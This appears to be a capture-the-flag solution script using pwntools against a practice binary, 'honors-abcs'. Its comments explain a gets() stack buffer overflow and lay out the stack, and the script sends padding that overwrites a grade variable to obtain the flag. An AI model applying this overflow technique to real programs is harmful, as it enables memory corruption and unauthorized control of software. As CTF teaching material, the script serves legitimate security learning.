from pwn import *

#p = remote('bin.bcactf.com', 49155)
p = process('./honors-abcs')

e = ELF('./honors-abcs')

## Read until the prompt
p.readuntil('1: ')

'''
gets() reads until it encounters a newline which allows you to overflow the 50-byte response buffer.
Here is the stack layout

response        {Frame offset -0x58}        This is the buffer that we fill
character       {Frame offset -0x1c}
FILE *          {Frame offset -0x18}
gets_result     {Frame offset -0x10}
grade           {Frame offset -0x0c}        We want to overwrite this so that grade * 4 > 100
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
One thing to be careful of. The overwrite occurs during the call to the gets() function. If your string
starts with an 'a' then the grade variable will be overwritten with '0 * 4' which you don't want. So start
with any other character.
'''

## add enough bytes to reach grade 0x58 - 0xc
response = 'b'*(0x58 - 0xc)

# The next bytes overflow grade. We just need a few
response += 'zz'

p.send(response + '\n')

p.readline()
p.readline()
p.readline()
flag = p.readline()

print('Flag: ', flag)

p.close()

